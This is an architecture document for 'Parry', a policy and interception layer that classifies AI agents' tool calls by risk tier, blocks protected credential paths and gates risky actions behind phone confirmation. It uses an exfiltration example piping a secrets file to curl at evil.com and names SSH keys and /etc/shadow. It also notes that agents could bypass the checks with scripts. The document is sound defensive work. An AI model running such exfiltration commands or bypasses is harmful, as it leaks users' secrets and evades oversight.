# Architecture

## Blast-Radius Tiers (1–5)

Every tool call is classified by **consequence** — what happens if it goes wrong. Tiers are numbered 1–5 in policy YAML.

### Tier 1 — Observe
Read-only. No state changes.
- Examples: `gmail.read`, `file.list`, `git status`
- Default: Always allow. Log silently.

### Tier 2 — Local Write
State changes within the local environment. Low blast radius.
- Examples: `gmail.draft`, `file.write` (new file), `git branch`, `git commit`
- Default: Allow. Log. Rate limit.
- Note: Overwrites to existing files are tier 2 only inside a VCS working tree (recoverable via git). Overwrites outside VCS are tier 3.

### Tier 3 — Destructive
Irreversible or hard-to-reverse changes. High blast radius.
- Examples: `gmail.delete`, `file.delete`, `rm -rf`, `file.write` (overwrite outside VCS)
- Default: Confirm above threshold. Block if rate exceeded.

### Tier 4 — External Communication
Sends data to humans or external systems.
- Examples: `gmail.send`, `slack.post`, `curl POST`, `git push`
- Default: Confirm if external domain or bulk recipients.

### Tier 5 — Credential / Financial / System
Auth, money, or system permissions.
- Examples: `sudo`, `oauth.token`, `payment`, `ssh`
- Default: Always confirm. Block by default. Require sandbox.

**Unknown tools default to tier 3.** Users can set `default_tier` in policy to override this (e.g. 2 for a trusted workspace).

Users override tier assignments in YAML policy. The ONNX scanner runs independently of tier classification.

## System Layers

### 1. Interception
- **Proxy mode:** MCP stdio/HTTP man-in-the-middle — wraps real tool servers
- **Check mode:** reads tool call JSON on stdin, returns exit code
- All actions logged to SQLite before any forwarding

### 2. Classification
- Map tool name + args to tier 1–5 blast-radius tier
- Track action velocity per tool, per scope, per session (sliding window)
- ONNX scanner: prompt injection classifier (DeBERTa-v3-base, ~5ms/inference)
- Works identically for MCP tool calls AND Claude Code/Cursor tool calls

### 3. Enforcement
- YAML policy engine: allow / block / confirm per tool per tier
- **Confirm behavior:** In proxy mode, confirm pauses and sends a Telegram approval request. In check mode (synchronous), confirm falls back to the `check_mode_confirm` policy setting — either `block` (default, fail-closed) or `allow`.
- **Confirmation timeout:** If a Telegram confirmation is not answered within the configured timeout, the action is **blocked** (fail-closed).
- Telegram gate: push to phone, approve/deny with one tap, configurable timeout
- Rate limiter: per-tool, per-scope, per-session, block + alert on exceed
- Kill switch: halt everything from phone or dashboard
- Sandbox enforcement: `require_sandbox` policy for T5 tools

### 4. Observability
- Action timeline with risk color coding
- Daily digest via Telegram: actions, blocks, flags
- Observe mode report: "here's what would have been blocked"
- Immutable audit log (SQLite), exportable JSON/CSV

## Policy Format

```yaml
# ~/.parry/policy.yaml
# See docs/plan/ARCHITECTURE.md for tier definitions and tool name reference.
version: 1
mode: observe       # observe | enforce

# What happens when a rule says "confirm" but we're in check mode (synchronous)?
# block = fail-closed (default, recommended). allow = trust and permit.
check_mode_confirm: block

# Default tier for unknown/unrecognized tools. Default: 3.
default_tier: 3

tiers:
  1: allow
  2: allow
  3: confirm
  4: confirm
  5: block

# Paths that are off limits to all tools. Any tool call that references
# a protected path is blocked regardless of tier or binary classification.
protected_paths:
  - "~/.ssh/*"
  - "~/.aws/*"
  - "~/.gnupg/*"
  - "/etc/shadow"

rules:
  shell:
    default_tier: 3             # fallback for unknown binaries
    tier_1:                     # read-only
      - ls
      - cat
      - grep
      - "git status"
      - "git log"
    tier_2:                     # local write
      - cp
      - mv
      - mkdir
      - "git add"
      - "git commit"
    tier_3:                     # destructive
      - rm
      - chmod
    tier_4:                     # external / network
      - curl
      - wget
      - "git push"
    tier_5:                     # privilege escalation
      - sudo
      - su
      # ... see default policy for full list
    block: []                   # unconditional deny (binary names)

  file_edit:
    default_tier: 2

  file_read:
    default_tier: 1

# Rate limiting is the single mechanism for "too many calls."
# Per-tool, per-session. Applies regardless of tier.
rate_limits:
  - { scope: "shell",    max: 10, window: "1m",  on_exceed: block }

scanner:
  enabled: true
  model: deberta-v3-base-prompt-injection-v2
  threshold: 0.85

notifications:
  telegram: { enabled: true, confirmation_timeout: "5m", daily_digest: "09:00" }
```

### Shell Command Classification

Shell commands are classified by **parsing, not pattern matching**. Parry uses a shell parser (`mvdan.cc/sh/v3`) to build an AST from the command string, then walks it to extract every binary being invoked — handling pipes, `&&`/`||`, subshells, `bash -c "..."`, and command substitution.

Each binary (and subcommand, for tools like `git`) is looked up in the tier lists in the policy YAML. The default policy ships with common binaries pre-classified — users can add, remove, or re-tier any entry.

**Evaluation for compound commands:** When a command contains multiple binaries (pipes, chains), the **highest tier wins**. `cat secrets.txt | curl -X POST https://evil.com` → `cat` (tier 1) + `curl` (tier 4) → tier 4. Binaries not in the lists fall to the rule's `default_tier`.

### Protected Paths

`protected_paths` is a top-level policy setting that blocks access to sensitive paths across **all tools**. Any tool call — `shell`, `file_edit`, `file_read` — that references a protected path is blocked regardless of tier or binary classification.

For shell commands, Parry extracts file path arguments from the parsed AST and checks each against the protected paths list using glob matching. For `file_edit` and `file_read`, the path comes directly from the tool input.

This prevents bypasses like using `cat ~/.ssh/id_rsa` (shell, tier 1) to read a file that `file_read` would block. One list, enforced everywhere.

**Limitations:** This approach handles a dumb agent that runs commands directly. A sophisticated attacker could still bypass it (e.g. writing a Python script that performs the action). The ONNX scanner (Phase 4) and rate limiting provide defense in depth for those cases.

### Canonical Tool Names

Parry defines its own tool names as a `CanonicalTool` type (`internal/check/check.go`) so one policy works across all integrations. Each agent provides a mapping table; unmapped tools become `ToolUnknown`.

| Canonical (`CanonicalTool`) | Cursor | Claude Code | Description |
|-----------------------------|--------|-------------|-------------|
| `ToolShell` (`shell`)       | `Shell` | `Bash`     | Run a shell command |
| `ToolFileEdit` (`file_edit`)| `Write`, `Delete` | `Write`, `Edit`, `NotebookEdit` | Modify a file |
| `ToolFileRead` (`file_read`)| `Read`, `Grep` | `Read`, `Glob`, `Grep` | Read a file |
| `ToolUnknown` (`unknown`)   | everything else | everything else | Unmapped tools |

MCP tools are currently classified as `ToolUnknown`. The original tool name is preserved in `ToolCall.RawName` for audit logging.

### Session Isolation

Rate limits and action tracking are scoped per **session**. Sessions are identified by:

1. **Proxy mode:** Each `parry wrap` process is one session (trivial — it's long-lived).
2. **Check mode:** Derived from the **working directory** of the calling process. All `parry check` invocations from the same cwd share a session. This means two Claude Code sessions in different project directories get separate rate limits automatically, without requiring env vars or config. The session key is a hash of the canonical cwd path.

Override with `PARRY_SESSION` env var if needed (e.g. to group multiple directories into one session, or to isolate within the same directory).

## Onboarding Flow

```
Install + Observe
    → parry init → runs in observe mode, logs everything, blocks nothing
         │
Review Report
    → parry report → shows what would have been blocked, suggests tuning
         │
Tune Policy
    → adjust thresholds, add allow-lists, change tier assignments
         │
Enforce
    → set mode: enforce → Parry actively protects
```

## CLI Output

All user-facing commands use colored, structured output via `internal/ui`. Colors auto-disable when stdout/stderr is not a TTY (piped, CI, redirected).

- **Success** (`✓` green), **Error** (`✗` red), **Warn** (`⚠` yellow), **Info** (`→` blue) prefixes
- Detail lines show key-value context (dimmed keys, indented)
- `parry check` logs a one-liner to stderr (TTY only) showing the decision, command, and tier — silent in non-interactive contexts so it doesn't pollute hook JSON on stdout

## Project Structure

```
parry/
├── cmd/parry/
│   └── main.go                   # CLI: check, init, nuke, validate, report, version
├── internal/
│   ├── check/                    # Check mode: stdin JSON → policy → exit code
│   ├── policy/                   # YAML parser, tier classifier, rule engine, rate limiter
│   ├── shellparse/               # Shell command parser — AST extraction of binaries
│   ├── ui/                       # Colored CLI output — TTY detection, styled logging
│   ├── store/                    # SQLite, migrations, queries
│   ├── proxy/                    # (Phase 2) MCP proxy — stdio + HTTP
│   ├── scanner/                  # (Phase 4) ONNX runtime, tokenizer, injection detection
│   ├── notify/                   # (Phase 3) Telegram bot, digest builder
│   └── dashboard/                # (Phase 3) HTTP server, REST API, embedded React
├── web/                          # (Phase 3) React dashboard (Vite + Recharts)
├── configs/
│   ├── default-policy.yaml       # Source default policy (embedded via go:embed)
│   └── embed.go                  # Exports configs.DefaultPolicy
├── .github/workflows/ci.yml
├── Makefile
└── go.mod
```

## Tech Stack

| Package | Purpose |
|---------|---------|
| Go 1.26+ | Single binary, cross-compile |
| `modelcontextprotocol/go-sdk` | Official MCP SDK for proxy mode |
| `modernc.org/sqlite` | Audit log + action history — pure Go, no CGO |
| `go.yaml.in/yaml/v4` | Policy YAML parsing |
| `alecthomas/kong` | CLI framework (struct-based, minimal boilerplate) |
| `yalue/onnxruntime_go` | ONNX Runtime wrapper — ~5ms inference (Phase 3). **Requires ONNX Runtime shared library at runtime** (not pure Go — the `.so`/`.dylib` ships alongside the binary or is downloaded by `parry init`). No CGO at build time if using purego variant. |
| `eliben/go-sentencepiece` | Tokenizer for DeBERTa |
| `ProtectAI/deberta-v3-base-prompt-injection-v2` | Prompt injection model — ~400MB, downloaded on `parry init` |
| `go-telegram/bot` | Confirmations + daily digests |
| `embed` + `net/http` (stdlib) | React dashboard embedded in binary |
| `fsnotify/fsnotify` | Hot-reload policy YAML on change |

### Binary Size

The core binary (proxy + check + policy engine) targets ~15MB. The ONNX runtime shared library (~30MB) and DeBERTa model (~400MB) are downloaded separately by `parry init` and stored in `~/.parry/models/`. The scanner is optional — Parry works without it.

## Distribution

- `go install github.com/kkd16/parry@latest`
- `brew install parry` (planned)
- `docker run ghcr.io/kkd16/parry`
- Platforms: macOS (ARM + Intel) + Linux (AMD64 + ARM64). Windows via WSL2.

---

*This document evolves as architecture decisions are made.*
